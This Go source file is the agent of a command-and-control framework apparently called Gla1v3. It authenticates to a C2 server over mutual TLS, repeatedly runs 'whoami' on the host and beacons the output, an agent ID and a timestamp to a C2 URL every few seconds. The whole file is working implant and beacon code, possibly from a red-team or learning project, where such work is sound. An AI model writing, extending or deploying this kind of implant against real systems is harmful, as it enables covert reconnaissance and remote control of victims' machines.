package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// 1. Load embedded client cert + key
	cert, err := tls.LoadX509KeyPair("../certs/agent.crt", "../certs/agent.key")
	if err != nil {
		log.Fatal("Failed to load agent cert/key:", err)
	}

	// 2. Load CA so we trust the server
	caCert, err := os.ReadFile("../certs/ca.crt")
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// 3. mTLS config
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   10 * time.Second,
	}

	// 4. Beacon loop with whoami execution and JSON POST
	agentID := "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())

	// Configurable via env
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}
	beaconInterval := 8 * time.Second
	if v := os.Getenv("BEACON_INTERVAL_SEC"); v != "" {
		if iv, err := time.ParseDuration(v + "s"); err == nil {
			beaconInterval = iv
		}
	}

	// Limits
	const cmdTimeout = 3 * time.Second
	const maxOutput = 2048

	seq := 0
	for {
		seq++

		// Run whoami with timeout
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		cmd := exec.CommandContext(ctx, "whoami")
		outBytes, err := cmd.Output()
		cancel()

		output := ""
		errStr := ""
		if err != nil {
			// include stderr if possible
			if ee, ok := err.(*exec.ExitError); ok {
				errStr = strings.TrimSpace(string(ee.Stderr))
			} else {
				errStr = err.Error()
			}
			log.Printf("whoami failed: %v", err)
		}
		if len(outBytes) > 0 {
			output = strings.TrimSpace(string(outBytes))
			if len(output) > maxOutput {
				output = output[:maxOutput] + "...(truncated)"
			}
		}

		// Build structured payload
		payload := map[string]interface{}{
			"agent_id": agentID,
			"seq":      seq,
			"output":   output,
			"error":    errStr,
			"ts":       time.Now().UTC().Format(time.RFC3339),
		}

		bodyBytes, jerr := json.Marshal(payload)
		if jerr != nil {
			log.Printf("Failed to marshal beacon payload: %v", jerr)
			time.Sleep(beaconInterval)
			continue
		}

		req, rerr := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
		if rerr != nil {
			log.Printf("Failed to create request: %v", rerr)
			time.Sleep(beaconInterval)
			continue
		}
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Agent-ID", agentID)

		resp, derr := client.Do(req)
		if derr != nil {
			log.Printf("Beacon POST failed: %v", derr)
		} else {
			log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, agentID, seq)
			resp.Body.Close()
		}

		time.Sleep(beaconInterval)
	}
}
